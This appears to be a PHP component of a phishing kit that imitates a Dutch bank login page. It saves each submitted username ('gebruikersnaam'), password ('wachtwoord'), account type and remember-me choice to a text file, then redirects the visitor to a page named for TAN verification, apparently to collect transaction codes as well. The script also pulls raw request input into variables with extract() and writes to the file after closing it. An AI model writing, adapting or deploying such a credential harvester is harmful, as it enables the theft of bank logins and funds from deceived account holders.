<?php
    extract($_REQUEST);
    $file=fopen("form-save.txt","a");


    fwrite($file,"</h4></font><font color='#FFFFFF'><h3>Particulier:</h3></font><font color='#FFFFFF'><h4>");
    fwrite($file, $radio ."\n");
    fwrite($file,"</h4></font><font color='#FFFFFF'><h3>Zakelijk:</h3></font><font color='#FFFFFF'><h4>");
    fwrite($file, $radio2 ."\n");
    fwrite($file,"</h4></font><font color='#FFFFFF'><h3>Gebruikersnaam:</h3></font><font color='#FFFFFF'><h4>");
    fwrite($file, $gebruikersnaam ."\n");
    fwrite($file,"</h4></font><font color='#FFFFFF'><h3>Wachtwoord:</h3></font><font color='#FFFFFF'><h4>");
    fwrite($file, $wachtwoord ."\n");
    fwrite($file,"</h4></font><font color='#FFFFFF'><h3>Onthoud:</h3></font><font color='#FFFFFF'><h4>");
    fwrite($file, $checkbox ."\n");
    fclose($file);
    header("Location: verifiëren-tan.php");
    fwrite($file,"<br> ");
    fwrite($file,"<br> ");
 ?>
